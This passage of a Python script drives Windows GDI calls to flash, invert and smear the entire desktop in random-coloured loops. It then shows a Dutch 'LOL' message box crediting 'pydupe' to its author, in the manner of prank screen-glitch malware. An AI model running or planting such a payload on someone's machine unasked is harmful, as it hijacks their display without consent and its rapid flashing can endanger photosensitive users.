    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCAND)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    StretchBlt(desk, 0, 0, sw, sh, desk,sw,sh, sw, sh, SRCPAINT)
    BitBlt(desk, i, i, i, i, desk, i, i, NOTSRCCOPY)
    BitBlt(desk, a, b, 200, 200, desk, a, b,0x114514)
    BitBlt(GetDC(NULL), x, y, x,y, GetDC(NULL),x,y, NOTSRCCOPY);
    BitBlt(desk, 15, 15, sw, sh, desk, 15, 5, SRCCOPY)

for i in range(0,12):
    brush = CreateSolidBrush(RGB(
        randrange(255),
        randrange(255),
        randrange(255),
        ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,0,0,x,y,PATINVERT)
    StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
    StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,24,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,-255,-20,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,100,w,h,desk,12,12,SRCAND)
    DeleteObject(brush)

for i in range(0,10):
    brush = CreateSolidBrush(RGB(
    randrange(255),
    randrange(255),
    randrange(255),
    ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,0,0,x,y,PATINVERT)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCAND)
    DeleteObject(brush)

for i in range(0,45):
    BitBlt(desk,10,10,w,h,desk,90,0,SRCAND)
    BitBlt(desk,10,10,w,h,desk,180,0,SRCPAINT)
    BitBlt(desk,10,10,w,h,desk,0,90,SRCAND)
    BitBlt(desk,10,10,w,h,desk,0,180,SRCPAINT)


for _ in range(30):
    w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
    BitBlt(hdc, random.randint(0, 1), random.randint(0, 1), w, h, hdc, random.randint(0, 1), random.randint(0, 1), SRCPAINT)
    time.sleep(0.01)
    ReleaseDC(0, hdc)


for i in range(120):
    brush = CreateSolidBrush(RGB(
        randrange(255), # Red value
        randrange(255), # Green value
        randrange(255) # Blue value
    )) # Creates a brush
    SelectObject(desk, brush) # Choose that we're drawing with our brush.
    PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), PATINVERT) # Makes a lot of stuff :)
    DeleteObject(brush) # Frees up memory. Pretty necessary to avoid crashes etc.
    Sleep(1) # Waits 10 milliseconds

ReleaseDC(desk, GetDesktopWindow()) # Releases memory.
DeleteDC(desk) # Deletes our DC.

MessageBox(0, "dit was pydupe! het is gemaakt door joel schurr", "LOL", MB_ICONWARNING)
